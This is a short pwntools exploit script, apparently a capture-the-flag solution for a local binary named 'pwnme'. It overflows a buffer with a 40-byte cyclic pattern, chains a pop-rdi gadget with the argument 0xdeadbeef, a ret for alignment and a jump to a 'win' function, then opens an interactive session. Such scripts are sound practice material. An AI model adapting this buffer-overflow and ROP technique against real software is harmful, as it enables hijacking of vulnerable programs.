from pwn import *

elf = context.binary = ELF("./pwnme")
rop = ROP(elf)
p = process()

win = 0x401176
payload = flat(
    cyclic(40),
    rop.rdi.address,
    0xdeadbeef,
    rop.ret.address,
    win
)
write("payload", payload)
p.sendlineafter(b'\n', payload)
p.interactive()